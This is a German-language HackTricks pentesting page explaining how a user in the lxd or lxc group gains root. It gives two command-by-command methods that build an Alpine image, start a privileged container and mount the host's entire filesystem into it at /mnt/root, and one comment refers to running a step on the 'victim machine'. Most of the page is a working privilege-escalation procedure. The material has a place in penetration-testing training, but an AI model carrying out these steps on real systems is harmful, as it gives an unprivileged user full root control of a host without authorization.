# lxd/lxc Gruppe - Privilegieneskalation

{{#include ../../../banners/hacktricks-training.md}}

Wenn Sie zur _**lxd**_ **oder** _**lxc**_ **Gruppe** gehören, können Sie root werden.

## Ausnutzen ohne Internet

### Methode 1

Sie können auf Ihrem Rechner diesen Distro-Builder installieren: [https://github.com/lxc/distrobuilder ](https://github.com/lxc/distrobuilder)(folgen Sie den Anweisungen auf GitHub):
```bash
sudo su
# Install requirements
sudo apt update
sudo apt install -y git golang-go debootstrap rsync gpg squashfs-tools

# Clone repo
git clone https://github.com/lxc/distrobuilder

# Make distrobuilder
cd distrobuilder
make

# Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml

# Create the container
## Using build-lxd
sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.18
## Using build-lxc
sudo $HOME/go/bin/distrobuilder build-lxc alpine.yaml -o image.release=3.18
```
Laden Sie die Dateien **lxd.tar.xz** und **rootfs.squashfs** hoch, fügen Sie das Image zum Repo hinzu und erstellen Sie einen Container:
```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine

# Check the image is there
lxc image list

# Create the container
lxc init alpine privesc -c security.privileged=true

# List containers
lxc list

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```
> [!CAUTION]
> Wenn Sie diesen Fehler _**Fehler: Kein Speicherpool gefunden. Bitte erstellen Sie einen neuen Speicherpool**_\
> Führen Sie **`lxd init`** aus und **wiederholen** Sie den vorherigen Befehlssatz

Schließlich können Sie den Container ausführen und Root erhalten:
```bash
lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```
### Methode 2

Erstellen Sie ein Alpine-Image und starten Sie es mit dem Flag `security.privileged=true`, wodurch der Container gezwungen wird, als Root mit dem Host-Dateisystem zu interagieren.
```bash
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686

# import the image
lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

# before running the image, start and configure the lxd storage pool as default
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
```
{{#include ../../../banners/hacktricks-training.md}}
